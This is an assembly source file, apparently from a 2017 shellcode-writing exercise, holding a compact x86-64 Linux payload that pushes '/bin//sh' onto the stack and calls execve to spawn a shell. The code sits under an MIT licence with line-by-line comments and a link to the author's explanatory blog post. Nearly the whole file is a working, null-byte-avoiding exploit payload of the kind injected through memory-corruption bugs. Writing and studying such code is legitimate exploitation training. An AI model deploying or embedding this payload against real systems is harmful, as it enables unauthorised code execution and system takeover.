;The MIT License (MIT)

;Copyright (c) 2017 Robert L. Taylor

;Permission is hereby granted, free of charge, to any person obtaining a
;copy of this software and associated documentation files (the “Software”),
;to deal in the Software without restriction, including without limitation
;the rights to use, copy, modify, merge, publish, distribute, sublicense,
;and/or sell copies of the Software, and to permit persons to whom the
;Software is furnished to do so, subject to the following conditions:

;The above copyright notice and this permission notice shall be included
;in all copies or substantial portions of the Software.

;The Software is provided “as is”, without warranty of any kind, express or
;implied, including but not limited to the warranties of merchantability,
;fitness for a particular purpose and noninfringement. In no event shall the
;authors or copyright holders be liable for any claim, damages or other
;liability, whether in an action of contract, tort or otherwise, arising
;from, out of or in connection with the software or the use or other
;dealings in the Software.
;
; For a detailed explanation of this shellcode see my blog post:
; http://a41l4.blogspot.ca/2017/01/execvestack1434.html
global _start

section .text

_start:
	; zeros RAX, RDX and RSI with only 4 bytes of machine code
	xor esi,esi
	mul esi

	; null terminator for the following string
	push rax

	; push /bin//sh in reverse
	mov rbx,'/bin//sh'
	push rbx

	; store /bin//sh address in RDI, points at string
	push rsp
	pop rdi

	; Call the Execve syscall
	mov al, 59
	syscall